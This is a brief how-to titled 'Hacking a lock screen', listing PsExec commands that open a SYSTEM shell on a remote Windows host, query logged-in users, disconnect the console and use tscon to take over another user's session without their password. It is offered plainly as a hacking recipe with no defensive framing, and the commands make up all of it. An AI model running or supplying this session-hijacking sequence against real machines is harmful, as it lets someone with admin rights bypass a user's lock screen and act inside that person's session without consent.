Hacking a lock screen

Computers in a workgroup
1. Open local cmd with administrator priv
2. psexec -s \\hostname cmd

Computer Joined to a domain
1. psexec -s \\hostname query user
if user has console then
	psexec -s \\hostname tsdiscon console
2. psexec -s \\hostname tscon "ID"  /dest:console
3  psexec -s \\hostname cmd
